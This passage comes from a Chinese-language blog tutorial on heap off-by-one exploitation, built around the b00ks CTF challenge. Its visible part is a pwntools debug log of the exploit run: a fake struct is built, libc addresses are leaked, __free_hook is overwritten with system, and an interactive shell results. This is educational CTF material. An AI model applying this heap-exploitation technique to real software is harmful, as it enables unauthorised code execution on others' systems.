class="line">    <span class="number">00000000</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    <span class="number">00000070</span>  <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">98</span> <span class="number">83</span> <span class="number">75</span> <span class="number">55</span>  <span class="number">55</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>  │····│····│··uU│UU··│</span><br><span class="line">    <span class="number">00000080</span>  <span class="number">98</span> <span class="number">83</span> <span class="number">75</span> <span class="number">55</span>  <span class="number">55</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>  ff ff <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │··uU│UU··│····│····│</span><br><span class="line">    <span class="number">00000090</span>  <span class="number">0</span>a                                                  │·│</span><br><span class="line">    <span class="number">00000091</span></span><br><span class="line">[+] Fake book constructed! And two pointers were <span class="built_in">set</span> to book2.</span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x6f bytes:</span><br><span class="line">    <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. Create a book\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Delete a book\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Edit a book\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Print book detail\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Change current author name\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;6. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&gt; &#x27;</span></span><br><span class="line">[*] Off<span class="literal">-BY</span><span class="literal">-NULL</span> again! Now Book1 was <span class="built_in">set</span> to the fake book.</span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>x2 bytes:</span><br><span class="line">    <span class="string">&#x27;5\n&#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x13 bytes:</span><br><span class="line">    <span class="string">&#x27;Enter author name: &#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>x21 bytes:</span><br><span class="line">    <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n&#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x6f bytes:</span><br><span class="line">    <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. Create a book\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Delete a book\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Edit a book\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Print book detail\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Change current author name\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;6. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&gt; &#x27;</span></span><br><span class="line">[*] Leaking mmap address...</span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>x2 bytes:</span><br><span class="line">    <span class="string">&#x27;4\n&#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x10d bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">49</span> <span class="number">44</span> <span class="number">3</span>a <span class="number">20</span>  <span class="number">31</span> <span class="number">0</span>a <span class="number">4</span>e <span class="number">61</span>  <span class="number">6</span>d <span class="number">65</span> <span class="number">3</span>a <span class="number">20</span>  <span class="number">10</span> <span class="number">0</span>a <span class="number">44</span> <span class="number">65</span>  │ID: │<span class="number">1</span>·Na│me: │··De│</span><br><span class="line">    <span class="number">00000010</span>  <span class="number">73</span> <span class="number">63</span> <span class="number">72</span> <span class="number">69</span>  <span class="number">70</span> <span class="number">74</span> <span class="number">69</span> <span class="number">6</span>f  <span class="number">6</span>e <span class="number">3</span>a <span class="number">20</span> <span class="number">10</span>  <span class="number">0</span>a <span class="number">41</span> <span class="number">75</span> <span class="number">74</span>  │scri│ptio│n: ·│·Aut│</span><br><span class="line">    <span class="number">00000020</span>  <span class="number">68</span> <span class="number">6</span>f <span class="number">72</span> <span class="number">3</span>a  <span class="number">20</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │hor:│ aaa│aaaa│aaaa│</span><br><span class="line">    <span class="number">00000030</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    <span class="number">00000040</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">0</span>a <span class="number">49</span> <span class="number">44</span>  <span class="number">3</span>a <span class="number">20</span> <span class="number">32</span> <span class="number">0</span>a  <span class="number">4</span>e <span class="number">61</span> <span class="number">6</span>d <span class="number">65</span>  │aaaa│a·ID│: <span class="number">2</span>·│Name│</span><br><span class="line">    <span class="number">00000050</span>  <span class="number">3</span>a <span class="number">20</span> <span class="number">62</span> <span class="number">6</span>f  <span class="number">6</span>f <span class="number">6</span>b <span class="number">32</span> <span class="number">5</span>f  <span class="number">6</span>e <span class="number">61</span> <span class="number">6</span>d <span class="number">65</span>  <span class="number">0</span>a <span class="number">44</span> <span class="number">65</span> <span class="number">73</span>  │: bo│ok2_│name│·Des│</span><br><span class="line">    <span class="number">00000060</span>  <span class="number">63</span> <span class="number">72</span> <span class="number">69</span> <span class="number">70</span>  <span class="number">74</span> <span class="number">69</span> <span class="number">6</span>f <span class="number">6</span>e  <span class="number">3</span>a <span class="number">20</span> <span class="number">62</span> <span class="number">6</span>f  <span class="number">6</span>f <span class="number">6</span>b <span class="number">32</span> <span class="number">5</span>f  │crip│tion│: bo│ok2_│</span><br><span class="line">    <span class="number">00000070</span>  <span class="number">64</span> <span class="number">65</span> <span class="number">73</span> <span class="number">63</span>  <span class="number">0</span>a <span class="number">41</span> <span class="number">75</span> <span class="number">74</span>  <span class="number">68</span> <span class="number">6</span>f <span class="number">72</span> <span class="number">3</span>a  <span class="number">20</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │desc│·Aut│hor:│ aaa│</span><br><span class="line">    <span class="number">00000080</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    <span class="number">00000090</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">0</span>a <span class="number">0</span>a <span class="number">31</span>  │aaaa│aaaa│aaaa│a··<span class="number">1</span>│</span><br><span class="line">    <span class="number">000000</span>a0  <span class="number">2</span>e <span class="number">20</span> <span class="number">43</span> <span class="number">72</span>  <span class="number">65</span> <span class="number">61</span> <span class="number">74</span> <span class="number">65</span>  <span class="number">20</span> <span class="number">61</span> <span class="number">20</span> <span class="number">62</span>  <span class="number">6</span>f <span class="number">6</span>f <span class="number">6</span>b <span class="number">0</span>a  │. Cr│eate│ a b│ook·│</span><br><span class="line">    <span class="number">000000</span>b0  <span class="number">32</span> <span class="number">2</span>e <span class="number">20</span> <span class="number">44</span>  <span class="number">65</span> <span class="number">6</span>c <span class="number">65</span> <span class="number">74</span>  <span class="number">65</span> <span class="number">20</span> <span class="number">61</span> <span class="number">20</span>  <span class="number">62</span> <span class="number">6</span>f <span class="number">6</span>f <span class="number">6</span>b  │<span class="number">2</span>. D│elet│e a │book│</span><br><span class="line">    <span class="number">000000</span>c0  <span class="number">0</span>a <span class="number">33</span> <span class="number">2</span>e <span class="number">20</span>  <span class="number">45</span> <span class="number">64</span> <span class="number">69</span> <span class="number">74</span>  <span class="number">20</span> <span class="number">61</span> <span class="number">20</span> <span class="number">62</span>  <span class="number">6</span>f <span class="number">6</span>f <span class="number">6</span>b <span class="number">0</span>a  │·<span class="number">3</span>. │Edit│ a b│ook·│</span><br><span class="line">    <span class="number">000000</span>d0  <span class="number">34</span> <span class="number">2</span>e <span class="number">20</span> <span class="number">50</span>  <span class="number">72</span> <span class="number">69</span> <span class="number">6</span>e <span class="number">74</span>  <span class="number">20</span> <span class="number">62</span> <span class="number">6</span>f <span class="number">6</span>f  <span class="number">6</span>b <span class="number">20</span> <span class="number">64</span> <span class="number">65</span>  │<span class="number">4</span>. P│rint│ boo│k de│</span><br><span class="line">    <span class="number">000000</span>e0  <span class="number">74</span> <span class="number">61</span> <span class="number">69</span> <span class="number">6</span>c  <span class="number">0</span>a <span class="number">35</span> <span class="number">2</span>e <span class="number">20</span>  <span class="number">43</span> <span class="number">68</span> <span class="number">61</span> <span class="number">6</span>e  <span class="number">67</span> <span class="number">65</span> <span class="number">20</span> <span class="number">63</span>  │tail│·<span class="number">5</span>. │Chan│ge c│</span><br><span class="line">    <span class="number">000000</span>f0  <span class="number">75</span> <span class="number">72</span> <span class="number">72</span> <span class="number">65</span>  <span class="number">6</span>e <span class="number">74</span> <span class="number">20</span> <span class="number">61</span>  <span class="number">75</span> <span class="number">74</span> <span class="number">68</span> <span class="number">6</span>f  <span class="number">72</span> <span class="number">20</span> <span class="number">6</span>e <span class="number">61</span>  │urre│nt a│utho│<span class="built_in">r</span> na│</span><br><span class="line">    <span class="number">00000100</span>  <span class="number">6</span>d <span class="number">65</span> <span class="number">0</span>a <span class="number">36</span>  <span class="number">2</span>e <span class="number">20</span> <span class="number">45</span> <span class="number">78</span>  <span class="number">69</span> <span class="number">74</span> <span class="number">0</span>a <span class="number">3</span>e  <span class="number">20</span>           │me·<span class="number">6</span>│. Ex│it·&gt;│ │</span><br><span class="line">    <span class="number">0000010</span>d</span><br><span class="line">[+] Mmap address : <span class="number">0</span>x637365440a10</span><br><span class="line">[*] Calculating libc<span class="string">&#x27;s base</span></span><br><span class="line"><span class="string">[+] Libc&#x27;</span>s addr : <span class="number">0</span>x7ffff79e4000</span><br><span class="line">[*] Searching __free_hook &amp; system &amp; /bin/sh <span class="keyword">in</span> libc...</span><br><span class="line">[+] __free_hook address: <span class="number">0</span>x7ffff7dd18e8</span><br><span class="line">[+] system address: <span class="number">0</span>x7ffff7a334e0</span><br><span class="line">[+] /bin/sh address: <span class="number">0</span>x7ffff7b980fa</span><br><span class="line">[*] Changing book2<span class="string">&#x27;s pointers...</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">3</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x24 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span>Enter the book id you want to edit: <span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">1</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x1c bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span>Enter new book description: <span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x11 bytes:</span></span><br><span class="line"><span class="string">    00000000  fa 80 b9 f7  ff 7f 00 00  e8 18 dd f7  ff 7f 00 00  │····│····│····│····│</span></span><br><span class="line"><span class="string">    00000010  0a                                                  │·│</span></span><br><span class="line"><span class="string">    00000011</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x6f bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">1</span>. Create a book\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">2</span>. Delete a book\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">3</span>. Edit a book\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">4</span>. Print book detail\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">5</span>. Change current author name\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">6</span>. Exit\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt; <span class="string">&#x27;</span></span><br><span class="line"><span class="string">[+] Book2&#x27;</span>s name and description<span class="string">&#x27;s pointer has been changed!</span></span><br><span class="line"><span class="string">[*] Book2&#x27;</span>s name --&gt; /bin/sh</span><br><span class="line">[*] Book2<span class="string">&#x27;s desc --&gt; free_hook</span></span><br><span class="line"><span class="string">[*] Prepare to change book2&#x27;</span>s description, also known as __free_hook.</span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>x2 bytes:</span><br><span class="line">    <span class="string">&#x27;3\n&#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x24 bytes:</span><br><span class="line">    <span class="string">&#x27;Enter the book id you want to edit: &#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>x2 bytes:</span><br><span class="line">    <span class="string">&#x27;2\n&#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x1c bytes:</span><br><span class="line">    <span class="string">&#x27;Enter new book description: &#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>x9 bytes:</span><br><span class="line">    <span class="number">00000000</span>  e0 <span class="number">34</span> a3 f7  ff <span class="number">7</span>f <span class="number">00</span> <span class="number">00</span>  <span class="number">0</span>a                        │·<span class="number">4</span>··│····│·│</span><br><span class="line">    <span class="number">00000009</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x6f bytes:</span><br><span class="line">    <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. Create a book\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Delete a book\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Edit a book\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Print book detail\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Change current author name\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;6. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&gt; &#x27;</span></span><br><span class="line">[+] Now __free_hook<span class="string">&#x27;s address is system&#x27;</span>s address!</span><br><span class="line">[*] We just need to free book2.</span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>x2 bytes:</span><br><span class="line">    <span class="string">&#x27;2\n&#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x26 bytes:</span><br><span class="line">    <span class="string">&#x27;Enter the book id you want to delete: &#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>x2 bytes:</span><br><span class="line">    <span class="string">&#x27;2\n&#x27;</span></span><br><span class="line">[*] Ready <span class="keyword">in</span> <span class="number">3</span> seconds...</span><br><span class="line">[+] PWN!!</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"><span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>x3 bytes:</span><br><span class="line">    <span class="string">&#x27;ls\n&#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x9d bytes:</span><br><span class="line">    <span class="string">&#x27;1.py\tpwndbg-dev\t  Pygments-2.6.1.tar.gz\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;b00ks\tpwndbg-dev.zip\t  unicorn-1.0.2rc3-py2.py3-none-manylinux1_x86_64.whl\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;core\tpwntools-dev\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;end.py\tpwntools-dev.zip\n&#x27;</span></span><br><span class="line"><span class="number">1</span>.py    pwndbg<span class="literal">-dev</span>      Pygments<span class="literal">-2</span>.<span class="number">6.1</span>.tar.gz</span><br><span class="line">b00ks    pwndbg<span class="literal">-dev</span>.zip      unicorn<span class="literal">-1</span>.<span class="number">0.2</span>rc3<span class="literal">-py2</span>.py3<span class="literal">-none</span><span class="literal">-manylinux1_x86_64</span>.whl</span><br><span class="line">core    pwntools<span class="literal">-dev</span></span><br><span class="line">end.py    pwntools<span class="literal">-dev</span>.zip</span><br><span class="line"><span class="variable">$</span> whoami</span><br><span class="line">[<span class="type">DEBUG</span>] Sent <span class="number">0</span>x7 bytes:</span><br><span class="line">    <span class="string">&#x27;whoami\n&#x27;</span></span><br><span class="line">[<span class="type">DEBUG</span>] Received <span class="number">0</span>x7 bytes:</span><br><span class="line">    <span class="string">&#x27;ubuntu\n&#x27;</span></span><br><span class="line">ubuntu</span><br><span class="line"><span class="variable">$</span></span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Cyberangel</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://cyberangel.cn/2020/09/07/PWN%E5%85%A5%E9%97%A8%EF%BC%883-2-1%EF%BC%89-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/">https://cyberangel.cn/2020/09/07/PWN入门（3-2-1）-堆中的off-by-one/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://cyberangel.cn" target="_blank">Cyberangel-blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/09/15/PWN%E5%85%A5%E9%97%A8%EF%BC%883-3-1%EF%BC%89-Chunk%20Extend!Overlapping%EF%BC%88%E5%9F%BA%E7%A1%80%EF%BC%89/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PWN入门（3-3-1）-Chunk Extend/Overlapping（基础）</div></div></a></div><div class="next-post pull-right"><a href="/2020/09/03/PWN%E5%85%A5%E9%97%A8%EF%BC%883-1-2%EF%BC%89-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%A0%86%EF%BC%881%EF%BC%89/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PWN入门（3-1-2）-深入理解堆（1）</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%AE%9A%E4%B9%89"><span class="toc-number">1.</span> <span class="toc-text">简介及定义</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%BE%E4%BE%8B"><span class="toc-number">3.</span> <span class="toc-text">漏洞原理举例</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0%E3%80%81for-%E5%BE%AA%E7%8E%AF%E8%AF%AD%E6%B3%95%E5%9B%9E%E9%A1%BE"><span class="toc-number">3.1.</span> <span class="toc-text">0、for 循环语法回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E6%BA%A2%E5%87%BA%E4%B9%8B%E5%BE%AA%E7%8E%AF%E8%BE%B9%E7%95%8C%E4%B8%8D%E4%B8%A5%E8%B0%A8"><span class="toc-number">3.2.</span> <span class="toc-text">1、溢出之循环边界不严谨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%AF%B9%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%95%BF%E5%BA%A6%E5%88%A4%E6%96%AD%E6%9C%89%E8%AF%AF"><span class="toc-number">3.3.</span> <span class="toc-text">2、对字符串长度判断有误</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E8%AE%B2%E8%A7%A3"><span class="toc-number">4.</span> <span class="toc-text">实例讲解</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B"><span class="toc-number">5.</span> <span class="toc-text">程序流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-0%E3%80%81%E5%88%9B%E5%BB%BA%E5%9B%BE%E4%B9%A6"><span class="toc-number">5.1.</span> <span class="toc-text">1-0、创建图书</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%88%A0%E9%99%A4%E5%9B%BE%E4%B9%A6"><span class="toc-number">5.2.</span> <span class="toc-text">2、删除图书</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1%E3%80%81%E7%BC%96%E8%BE%91%E5%9B%BE%E4%B9%A6"><span class="toc-number">5.3.</span> <span class="toc-text">1-1、编辑图书</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E4%BF%AE%E6%94%B9%E5%9B%BE%E4%B9%A6%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">5.4.</span> <span class="toc-text">3、修改图书的类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E6%89%93%E5%8D%B0%E5%9B%BE%E4%B9%A6%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">5.5.</span> <span class="toc-text">4、打印图书的信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E4%BF%AE%E6%94%B9%E4%BD%9C%E8%80%85%E5%90%8D"><span class="toc-number">5.6.</span> <span class="toc-text">5、修改作者名</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IDA-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">6.</span> <span class="toc-text">IDA 静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#main-%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="toc-number">6.1.</span> <span class="toc-text">main 函数分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%9B%BE%E4%B9%A6%E5%8A%9F%E8%83%BD%E5%88%86%E6%9E%90"><span class="toc-number">6.2.</span> <span class="toc-text">创建图书功能分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%9B%BE%E4%B9%A6%E5%86%85%E5%AE%B9%E5%8A%9F%E8%83%BD%E5%88%86%E6%9E%90"><span class="toc-number">6.3.</span> <span class="toc-text">修改图书内容功能分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E5%9B%BE%E4%B9%A6%E5%8A%9F%E8%83%BD"><span class="toc-number">6.4.</span> <span class="toc-text">删除图书功能</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E5%9B%BE%E4%B9%A6%E4%BF%A1%E6%81%AF%E5%8A%9F%E8%83%BD%E5%88%86%E6%9E%90"><span class="toc-number">6.5.</span> <span class="toc-text">打印图书信息功能分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E4%BD%9C%E8%80%85%E5%90%8D%E5%8A%9F%E8%83%BD%E5%88%86%E6%9E%90"><span class="toc-number">6.6.</span> <span class="toc-text">修改作者名功能分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">6.7.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E8%AE%B2%E8%A7%A3%E5%8F%8A%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-number">7.</span> <span class="toc-text">思路讲解及动态调试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%AE%9A%E4%BD%8D%E8%BE%93%E5%85%A5%E7%9A%84%E4%BD%9C%E8%80%85%E5%90%8D%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="toc-number">7.1.</span> <span class="toc-text">1、定位输入的作者名的地址</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">7.1.1.</span> <span class="toc-text">第一种方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">7.1.2.</span> <span class="toc-text">第二种方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%B3%84%E9%9C%B2%E5%87%BA%E5%9B%BE%E4%B9%A6%E7%BB%93%E6%9E%84%E4%BD%93%E6%8C%87%E9%92%88"><span class="toc-number">7.2.</span> <span class="toc-text">2、泄露出图书结构体指针</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E8%A6%86%E7%9B%96%E5%8E%9F%E6%9C%89%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93%E6%8C%87%E9%92%88"><span class="toc-number">7.3.</span> <span class="toc-text">3、覆盖原有的结构体指针</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E4%BC%AA%E9%80%A0%E7%BB%93%E6%9E%84%E4%BD%93%E5%B9%B6%E6%B3%84%E9%9C%B2-book2-name%E3%80%81book2-desc"><span class="toc-number">7.4.</span> <span class="toc-text">4、伪造结构体并泄露 book2_name、book2_desc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E8%AE%A1%E7%AE%97-libc-%E5%9F%BA%E5%9C%B0%E5%9D%80%EF%BC%8Cfreehook%E3%80%81system%E3%80%81-bin-sh-%E5%9C%B0%E5%9D%80"><span class="toc-number">7.5.</span> <span class="toc-text">5、计算 libc 基地址，freehook、system、&#x2F;bin&#x2F;sh 地址</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp-%E5%86%85%E5%AE%B9%E5%8F%8A%E6%89%A7%E8%A1%8C%E8%AF%A6%E6%83%85"><span class="toc-number">8.</span> <span class="toc-text">exp 内容及执行详情</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2021 By Cyberangel</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div 